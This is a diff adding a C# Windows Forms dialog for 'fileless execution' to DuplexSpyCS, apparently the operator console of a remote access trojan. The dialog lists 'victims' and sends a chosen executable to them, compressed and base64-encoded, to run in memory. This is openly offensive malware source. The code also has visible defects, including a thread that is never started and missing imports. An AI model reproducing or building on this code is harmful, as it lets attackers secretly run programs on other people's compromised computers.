@@ -1,0 +1,123 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace DuplexSpyCS
+{
+    public partial class frmFilelessExec : Form
+    {
+        public List<Victim> m_lsVictim;
+
+        private bool m_bSignalPause { get; set; }
+        private bool m_bSignalStop { get; set; }
+
+        public frmFilelessExec()
+        {
+            InitializeComponent();
+        }
+
+        void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
+        {
+            List<Victim> lsTarget = new List<Victim>();
+            Invoke(new Action(() =>
+            {
+                lsTarget.AddRange(
+                    listView1.CheckedItems.Cast<ListViewItem>()
+                    .Where(x => x.Checked)
+                    .Select(x => (Victim)x.Tag)
+                    .ToList()
+                    );
+            }));
+
+            string szArgs = string.Join(",", alpArgs.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string szData = Convert.ToBase64String(abData);
+
+            ThreadPool.SetMinThreads(1, 1);
+            ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
+            foreach (Victim v in lsTarget)
+            {
+                ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
+            }
+        }
+
+        void fnSetup()
+        {
+            //Controls
+            listView1.FullRowSelect = true;
+            listView1.CheckBoxes = true;
+
+            //setup
+            foreach (Victim v in m_lsVictim)
+            {
+                ListViewItem item = new ListViewItem(v.ID);
+                item.SubItems.Add("?");
+                item.Tag = v;
+
+                listView1.Items.Add(item);
+            }
+        }
+
+        private void frmFilelessExec_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        //Open exe.
+        private void button1_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Filter = "Executable (*.exe)|*.exe";
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                textBox1.Text = ofd.FileName;
+            }
+        }
+        //Check all.
+        private void button2_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.Items)
+                item.Checked = true;
+        }
+        //Uncheck all.
+        private void button3_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.Items)
+                item.Checked = false;
+        }
+        //Go
+        private void button4_Click(object sender, EventArgs e)
+        {
+            string szFileName = textBox1.Text;
+            string szArgs = textBox2.Text;
+
+            if (!File.Exists(szFileName))
+            {
+                MessageBox.Show("File not found: " + szFileName, "FileNotExists", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int nThdCnt = (int)numericUpDown1.Value;
+            string[] alpArgs = szArgs.Split(' ');
+            byte[] abData = File.ReadAllBytes(szFileName);
+            abData = C1.Compress(abData);
+
+            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData));
+        }
+        //Pause
+        private void button6_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Stop
+        private void button5_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
